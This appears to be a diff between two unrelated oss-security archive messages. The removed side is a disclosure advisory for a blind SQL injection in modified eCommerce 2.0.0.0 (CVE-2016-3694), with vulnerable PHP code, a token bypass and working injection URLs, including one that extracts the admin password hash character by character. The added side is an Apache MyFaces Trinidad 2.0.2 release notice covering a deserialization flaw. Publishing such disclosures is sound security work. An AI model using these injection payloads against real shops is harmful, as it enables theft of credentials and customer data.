@@ -1,126 +1,110 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/20/10
-Message-ID: <f7b02c4100f5b3b65652faed3d6999ee@mpx2.rz.ruhr-uni-bochum.de>
-Date: Wed, 20 Apr 2016 19:42:26 +0200
-From: Felix Maduakor <Felix.Maduakor@...r-uni-bochum.de>
-To: oss-security@...ts.openwall.com
-Subject: CVE-2016-3694 modified eCommerce Shopsoftware 2.0.0.0 rev 9678 - Blind SQL Injection
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/29/24
+Message-ID: <CAM1yOjaDZ_cFH4zYxFH4P=undqA7nbHcr3HQydPh7W3Ht5HdYg@mail.gmail.com>
+Date: Thu, 29 Sep 2016 11:50:07 -0400
+From: Mike Kienenberger <mkienenb@...il.com>
+To: announce@...aces.apache.org, MyFaces Development <dev@...aces.apache.org>,  MyFaces Discussion <users@...aces.apache.org>
+Cc: "security@...che.org" <security@...che.org>, oss-security@...ts.openwall.com,  bugtraq@...urityfocus.com
+Subject: [ANNOUNCE][CVE-2016-5019] Apache MyFaces Trinidad 2.0.2 released
 Content-Type: text/plain; charset=utf-8
 
-# Title: Blind Injection modified eCommerce 2.0.0.0 rev 9678
-# Date: 16.04.2016
-# Category: webapps
-# Vendor Homepage: http://www.modified-shop.org/download
-# Software Link: 
-http://www.modified-shop.org/forum/index.php?action=downloads;sa=downfile&id=96
-# Version: 2.0.0.0 rev 9678
-# Tested on: Apache/2.4.7, PHP Version 5.5.9, Linux
-# Exploit Author: Felix Maduakor
-# Contact: Felix.Maduakor@....de
-# CVE: CVE-2016-3694
+The Apache MyFaces team is pleased to announce the release of Apache
+MyFaces Trinidad 2.0.2.
 
-Product Description:
-modified eCommerce is an Open Source shopsoftware
+MyFaces Trinidad is a feature-rich renderkit for JavaServer(tm) Faces
+that provides an extendibles framework and extensive skinning support.
+This version is designed to be used with the JSF 2.0 specification and
+works with either Mojarra or MyFaces.
 
-Vulnerability Details:
-Attackable are the GET-parameters 'orders_status' and 'customers_status' 
-through 'easybillcsv.php':
+CVE-2016-5019:
+Trinidad’s CoreResponseStateManager both reads and writes view state
+strings using
+ObjectInputStream/ObjectOutputStream directly.  By doing so, Trinidad
+bypasses the
+view state security features provided by the JSF implementations - ie. the view
+state is not encrypted and is not MAC’ed.  Trinidad’s
+CoreResponseStateManager will
+blindly deserialize untrusted view state strings, which makes Trinidad-based
+applications vulnerable to deserialization attacks.
 
+Apache MyFaces Trinidad is available in both binary and source
+distributions, and there are examples available as well:
 
-File: [shoproot]/api/easybill/easybillcsv.php
+    * http://myfaces.apache.org/trinidad/download.html
 
-[24]        if (isset($_GET['token']) &&  $_GET['token'] == 
-MODULE_EASYBILL_CSV_CRON_TOKEN) {
-[25-61]         ...
-[62]            } else {
-[63]                    die('Direct Access to this location is not 
-allowed.');
+Apache MyFaces Trinidad is available in the central Maven repository
+under Group ID "org.apache.myfaces.trinidad"
 
-As default option the easybill-module is not installed and the constant 
-MODULE_EASYBILL_CSV_CRON_TOKEN is not set. As long as the 
-easybill-module is not installed, it is possible to bypass the 
-restriction: 
-[Shoproot]/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN
+Release Notes - MyFaces Trinidad - Version 2.0.2
 
+Bug
+    [TRINIDAD-2542] - CVE-2016-5019: MyFaces Trinidad view state
+deserialization security vulnerability
 
-[35]            if (count($_GET['orders_status']) > 0) {
-[36]            $_GET['orders_status'] = preg_replace("'[\r\n\s]+'", '', 
-$_GET['orders_status']);
-[37]            $orders_status = explode(',', $_GET['orders_status']);
-[38]            $module->from_orders_status = implode("', '", 
-$orders_status);
-[39]            }
+    [TRINIDAD-2218] - Need an ability for the WindowManager
+implementation to be executed before all Configurators and filters and
+to complete teh response
+    [TRINIDAD-2224] - Client DateTimeConverter _fix2DYear does not
+handle th_TH locale
+    [TRINIDAD-2230] - adjustments to the UIXComponentBase
+subscribeToEvent and unsubscribeFromEvent implementation
+    [TRINIDAD-2233] - x-frame-options header not working in trinidad
+    [TRINIDAD-2245] - ForEach tag throws ArrayIndexOfBoundsException
+when the end attribute is same as the size of the List
+    [TRINIDAD-2252] -
+ViewDeclarationLanguageFactoryImpl$ChangeApplyingVDLWrapper does not
+override non-abstract retargetMethodExpressions() causing composite
+component actions not to fire
+    [TRINIDAD-2260] - tr:inputListOfValues - no ReturnEvent is fired
+when using facelets
+    [TRINIDAD-2262] - UIXComponentBase calls setInView(false) before
+the component is actually removed from tree
+    [TRINIDAD-2263] - StateManagerImp.saveView should not check
+current request token
+    [TRINIDAD-2285] - avoid exceptions in design time for agent rules
+    [TRINIDAD-2286] - alias wrongly specified in base-desktop.css
+    [TRINIDAD-2289] - function _pprControlCapture() causes an error in
+IE8 when it tries to focus on a PPR'd element
+    [TRINIDAD-2299] - f:convertnumber throws error when the number
+input by user has leading or trailing grouping separator char
+    [TRINIDAD-2301] - avoid exceptions in design time when wrong style
+sheet name is specified in trinidad-skins.xml
+    [TRINIDAD-2303] - State saving skips facets (component resources).
+    [TRINIDAD-2309] - perf: change the concurrenthashmap to arraymap
+and fix the golden files
+    [TRINIDAD-2327] - update RenderingContext.getIcon() documentation
+    [TRINIDAD-2329] - remove acc datatable=0 from non data tables
+    [TRINIDAD-2340] - LocaleElementsResourceLoader init dependency on
+request path
+    [TRINIDAD-2348] - HeadRenderer renders meta tags in wrong order for IE
+    [TRINIDAD-2349] - TreeRenderer renders duplicate IDs
+    [TRINIDAD-2393] - GlobalConfiguratorImpl will not always clean up resources
+    [TRINIDAD-2408] - TrPage._getTextContent is not working in IE10
+    [TRINIDAD-2525] - IE 11 - Unsupported JavaScript methods are used
+in Trinidad
 
+Improvement
 
-[43]            if (isset($_GET['customers_status'])) {
-[44]            $_GET['customers_status'] = preg_replace("'[\r\n\s]+'", 
-'', $_GET['customers_status']);
-[45]            $customers_status = explode(',', 
-$_GET['customers_status']);
-[46]            $module->from_customers_status = implode("', '", 
-$customers_status);
-[47]            }
+    [TRINIDAD-2172] - pseudo classes missing from CSSGenerationUtils
+    [TRINIDAD-2186] - Clirr runner tests should work off last revision
+rather then a fixed label
+    [TRINIDAD-2226] - Provide mechanism to reload skin definitions
+from trinidad-skins.xml
+    [TRINIDAD-2235] - Skinning: stable names for generated style sheets
+    [TRINIDAD-2248] - Change component templating scheme to generate
+superclasses of templated components rather than the templated
+components themselves
+    [TRINIDAD-2253] - Ability to synchronize UI view size with model cache size`
+    [TRINIDAD-2292] - Update Clirr Runner tests to check against Trinidad 2.0.0
+    [TRINIDAD-2330] - Add support for base64 encoded images in skin files.
+    [TRINIDAD-2391] - Enhancements to allow for custom FileUpload code
+    [TRINIDAD-2392] - Ability to control skin and compression programatically
+    [TRINIDAD-2394] - LabeledFacesMessage is not appropriately serializable
 
-As you can see in lines 35-39 and 43-47 the GET-parameters 
-'orders_status' and 'customers_status' are not escaped, but formatted 
-(removed whitespaces, replaced commas with "', '"). They will be set as 
-local variables of the "$module"-object.
+New Feature
 
-File: [shoproot][admin-folder]/includes/modules/system/easybillcsv.php
+    [TRINIDAD-2234] - Pregeneration of skin style sheets
 
-[63]        $export_query = xtc_db_query("SELECT DISTINCT o.orders_id
-[64]                                    FROM ".TABLE_ORDERS." o
-[65]                                    JOIN 
-".TABLE_ORDERS_STATUS_HISTORY." osh
-[66]                                      ON o.orders_id = osh.orders_id
-[67]                                   WHERE (o.orders_status IN ('" . 
-$this->from_orders_status . "')
-[68]                                          OR osh.orders_status_id IN 
-('" . $this->from_orders_status . "'))
-[69]                                     AND (o.last_modified >= '". 
-date( "Y-m-d H:i:s", strtotime($this->from_order_date)) . "'
-[70]                                          OR o.date_purchased >= '". 
-date( "Y-m-d H:i:s", strtotime($this->from_order_date)) . "')
-[71]                                     AND o.customers_status IN ('" . 
-$this->from_customers_status . "')
-[72]                                ORDER BY o.orders_id");
+regards,
 
-
-The unescaped GET-parameters get placed in the query on line 67, 68 and 
-71.
-Through the ORDER BY statement (with the explicit table-references) it 
-is not possible to use a union-based injection.
-The injection cannot include whitespaces or commas.
-
-POC [Proof of Concept]:
-
-http://127.0.0.1/shop/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN&orders_status=-111'))or-sleep(5)/*&customers_status=*/%23
-Will result in following query and execute the sleep-function for 5 
-seconds:
-
-SELECT DISTINCT o.orders_id
-                                    FROM ".TABLE_ORDERS." o
-                                     JOIN ".TABLE_ORDERS_STATUS_HISTORY." 
-osh
-                                       ON o.orders_id = osh.orders_id
-                                    WHERE (o.orders_status IN 
-('-111'))or-sleep(5)/*
-
-                                     long comment
-
-                                     */#comment
-                                ORDER BY o.orders_id
-
-There are multiple ways to bypass the whitespace/comma-filter. A 
-possible way to check if the first character of the admin-hash is '$' 
-would be:
-
-
-http://127.0.0.1/shop/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN&orders_status=-111'))or(Select(case(36)when(ascii(substring(`customers_password`FROM(1)FOR(1))))then-sleep(5)End)from`customers`where`customers_id`=1)/*&customers_status=*/%23
-
-
-
-
-Timeline
------
-[16.04.2016] Reporting vulnerability to vendor
+Mike Kienenberger
